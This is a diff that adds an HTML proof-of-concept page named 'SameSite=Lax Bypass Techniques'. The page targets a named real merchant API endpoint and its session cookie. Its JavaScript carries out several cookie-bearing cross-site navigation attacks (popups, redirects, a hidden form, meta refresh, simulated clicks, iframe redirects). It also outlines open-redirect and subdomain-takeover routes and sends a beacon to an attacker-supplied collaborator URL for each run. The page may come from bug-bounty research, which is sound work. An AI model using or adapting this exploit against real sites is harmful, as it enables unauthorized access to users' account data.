@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SameSite=Lax Bypass Techniques</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 30px auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #333;
+            margin-top: 0;
+        }
+        h2 {
+            color: #555;
+            border-bottom: 2px solid #007bff;
+            padding-bottom: 10px;
+        }
+        .method {
+            background: #f8f9fa;
+            padding: 20px;
+            margin: 15px 0;
+            border-left: 4px solid #007bff;
+        }
+        .method h3 {
+            margin-top: 0;
+            color: #007bff;
+        }
+        button {
+            padding: 12px 20px;
+            margin: 5px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        button:hover {
+            background: #0056b3;
+        }
+        .success {
+            background: #d4edda;
+            border-left: 4px solid #28a745;
+        }
+        .warning {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px 0;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        code {
+            background: #f4f4f4;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-size: 13px;
+        }
+        .info {
+            background: #e7f3ff;
+            border-left: 4px solid #2196F3;
+            padding: 15px;
+            margin: 15px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>SameSite=Lax Bypass Techniques</h1>
+        
+        <label>Collaborator URL:</label>
+        <input type="text" id="collab" placeholder="https://your-id.burpcollaborator.net">
+        
+        <div class="info">
+            <strong>Target:</strong> https://dashboard.route.com/api/mn/v1/stores<br>
+            <strong>Cookie:</strong> mpid (SameSite=Lax)<br>
+            <strong>CORS:</strong> Vulnerable (reflects origin)
+        </div>
+    </div>
+
+    <!-- Method 1: Window.open (Already Working) -->
+    <div class="container">
+        <div class="method success">
+            <h3>✅ Method 1: window.open() [WORKS]</h3>
+            <p>Opens API in new window. Top-level navigation sends SameSite=Lax cookies.</p>
+            <button onclick="method1_popup()">Execute Method 1</button>
+            <p style="margin-top:10px;font-size:13px;color:#666;">
+                <strong>Pro:</strong> Works immediately<br>
+                <strong>Con:</strong> Can't automatically read response (same-origin policy)
+            </p>
+        </div>
+    </div>
+
+    <!-- Method 2: Window.location Redirect -->
+    <div class="container">
+        <div class="method success">
+            <h3>✅ Method 2: window.location Redirect [WORKS]</h3>
+            <p>Redirects current window to API. User sees the data directly.</p>
+            <button onclick="method2_redirect()">Execute Method 2</button>
+            <p style="margin-top:10px;font-size:13px;color:#666;">
+                <strong>Pro:</strong> Simple, effective<br>
+                <strong>Con:</strong> Leaves your page, obvious to user
+            </p>
+        </div>
+    </div>
+
+    <!-- Method 3: Form GET Submission -->
+    <div class="container">
+        <div class="method success">
+            <h3>✅ Method 3: Form GET Submission [WORKS]</h3>
+            <p>Uses invisible form with GET method. SameSite=Lax allows this!</p>
+            <button onclick="method3_form()">Execute Method 3</button>
+            <form id="attack-form" method="GET" action="https://dashboard.route.com/api/mn/v1/stores" target="form_window" style="display:none;">
+            </form>
+            <p style="margin-top:10px;font-size:13px;color:#666;">
+                <strong>Pro:</strong> Opens in new window, sends cookies<br>
+                <strong>Con:</strong> Same as window.open
+            </p>
+        </div>
+    </div>
+
+    <!-- Method 4: Meta Refresh -->
+    <div class="container">
+        <div class="method success">
+            <h3>✅ Method 4: Meta Refresh Tag [WORKS]</h3>
+            <p>Opens page with meta refresh tag that redirects to API.</p>
+            <button onclick="method4_meta()">Execute Method 4</button>
+            <p style="margin-top:10px;font-size:13px;color:#666;">
+                <strong>Pro:</strong> Automatic redirect, sends cookies<br>
+                <strong>Con:</strong> User sees redirect happening
+            </p>
+        </div>
+    </div>
+
+    <!-- Method 5: Link Click Simulation -->
+    <div class="container">
+        <div class="method success">
+            <h3>✅ Method 5: Simulated Link Click [WORKS]</h3>
+            <p>Creates hidden link and clicks it programmatically.</p>
+            <button onclick="method5_link()">Execute Method 5</button>
+            <p style="margin-top:10px;font-size:13px;color:#666;">
+                <strong>Pro:</strong> Mimics natural navigation<br>
+                <strong>Con:</strong> Opens new window
+            </p>
+        </div>
+    </div>
+
+    <!-- Method 6: iframe + top.location (if no frame-ancestors) -->
+    <div class="container">
+        <div class="method warning">
+            <h3>⚠️ Method 6: iframe + top.location [MAY WORK]</h3>
+            <p>If site allows framing, embed and redirect from inside frame.</p>
+            <button onclick="method6_iframe()">Execute Method 6</button>
+            <p style="margin-top:10px;font-size:13px;color:#666;">
+                <strong>Pro:</strong> If it works, very stealthy<br>
+                <strong>Con:</strong> Blocked if X-Frame-Options or CSP frame-ancestors is set
+            </p>
+        </div>
+    </div>
+
+    <!-- Method 7: Open Redirect Chain -->
+    <div class="container">
+        <div class="method warning">
+            <h3>⚠️ Method 7: Open Redirect on route.com [ADVANCED]</h3>
+            <p>Find open redirect on route.com, use it to redirect to API.</p>
+            <button onclick="method7_redirect()">Show Example</button>
+            <div id="redirect-info" style="display:none;margin-top:10px;background:#fff;padding:10px;border:1px solid #ddd;">
+                <strong>Example:</strong><br>
+                <code>https://route.com/redirect?url=/api/mn/v1/stores</code><br><br>
+                If such endpoint exists, cookies will be sent!
+            </div>
+            <p style="margin-top:10px;font-size:13px;color:#666;">
+                <strong>Pro:</strong> Full bypass if found<br>
+                <strong>Con:</strong> Need to find open redirect first
+            </p>
+        </div>
+    </div>
+
+    <!-- Method 8: Subdomain Takeover -->
+    <div class="container">
+        <div class="method warning">
+            <h3>🎯 Method 8: Subdomain Takeover [ULTIMATE BYPASS]</h3>
+            <p>Take over abandoned subdomain on *.route.com - become same-site!</p>
+            <button onclick="method8_subdomain()">Show Details</button>
+            <div id="subdomain-info" style="display:none;margin-top:10px;background:#fff;padding:10px;border:1px solid #ddd;">
+                <strong>Steps:</strong><br>
+                1. Find unused subdomain: <code>evil.route.com</code><br>
+                2. Check DNS: <code>CNAME → unclaimed-service.com</code><br>
+                3. Claim the service: <code>evil.route.com → your-server</code><br>
+                4. Host PoC on <code>evil.route.com</code><br>
+                5. Now you're same-site! fetch() works! 🎉<br><br>
+                <strong>Result:</strong> Full automatic exploitation possible!
+            </div>
+            <p style="margin-top:10px;font-size:13px;color:#666;">
+                <strong>Pro:</strong> Complete bypass, fetch() works, full automation<br>
+                <strong>Con:</strong> Requires finding vulnerable subdomain
+            </p>
+        </div>
+    </div>
+
+    <script>
+        var API_URL = 'https://dashboard.route.com/api/mn/v1/stores';
+
+        // Method 1: window.open
+        function method1_popup() {
+            var win = window.open(API_URL, 'api_window', 'width=900,height=600');
+            if (!win) {
+                alert('Popup blocked!');
+                return;
+            }
+            alert('Method 1: Popup opened!\n\nCheck the window for merchant data.');
+            sendNotification('Method 1: window.open()');
+        }
+
+        // Method 2: window.location redirect
+        function method2_redirect() {
+            if (confirm('This will redirect your current window to the API.\n\nYou will see the merchant data directly.\n\nContinue?')) {
+                sendNotification('Method 2: window.location redirect');
+                setTimeout(function() {
+                    window.location.href = API_URL;
+                }, 1000);
+            }
+        }
+
+        // Method 3: Form GET submission
+        function method3_form() {
+            document.getElementById('attack-form').submit();
+            alert('Method 3: Form submitted!\n\nCheck the new window for merchant data.');
+            sendNotification('Method 3: Form GET submission');
+        }
+
+        // Method 4: Meta refresh
+        function method4_meta() {
+            var win = window.open('', 'meta_window', 'width=900,height=600');
+            if (!win) {
+                alert('Popup blocked!');
+                return;
+            }
+            win.document.write('<html><head><meta http-equiv="refresh" content="1;url=' + API_URL + '"></head><body><h1>Redirecting...</h1></body></html>');
+            alert('Method 4: Meta refresh initiated!\n\nWindow will redirect in 1 second.');
+            sendNotification('Method 4: Meta refresh redirect');
+        }
+
+        // Method 5: Link click simulation
+        function method5_link() {
+            var link = document.createElement('a');
+            link.href = API_URL;
+            link.target = 'link_window';
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            alert('Method 5: Link clicked!\n\nCheck the new window for merchant data.');
+            sendNotification('Method 5: Simulated link click');
+        }
+
+        // Method 6: iframe + top.location
+        function method6_iframe() {
+            var win = window.open('', 'iframe_window', 'width=900,height=600');
+            if (!win) {
+                alert('Popup blocked!');
+                return;
+            }
+            win.document.write('<html><body><script>setTimeout(function(){top.location.href="' + API_URL + '";}, 1000);<\/script><h1>Loading...</h1></body></html>');
+            alert('Method 6: iframe redirect initiated!\n\nIf no frame protection, window will redirect.');
+            sendNotification('Method 6: iframe + top.location');
+        }
+
+        // Method 7: Open redirect (example)
+        function method7_redirect() {
+            document.getElementById('redirect-info').style.display = 'block';
+            alert('Method 7: Open Redirect\n\nThis requires finding an open redirect vulnerability on route.com.\n\nSee the example below.');
+        }
+
+        // Method 8: Subdomain takeover (info)
+        function method8_subdomain() {
+            document.getElementById('subdomain-info').style.display = 'block';
+            alert('Method 8: Subdomain Takeover\n\nThis is the ultimate bypass!\n\nIf you control *.route.com, you become same-site and fetch() works perfectly.\n\nSee details below.');
+        }
+
+        // Send notification to collaborator
+        function sendNotification(method) {
+            var collab = document.getElementById('collab').value.trim();
+            if (!collab || !collab.startsWith('http')) return;
+
+            var data = {
+                timestamp: new Date().toISOString(),
+                method: method,
+                target: API_URL,
+                status: 'executed'
+            };
+
+            fetch(collab, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(data)
+            });
+
+            fetch(collab + '?method=' + encodeURIComponent(method), {
+                mode: 'no-cors'
+            });
+        }
+    </script>
+</body>
+</html>
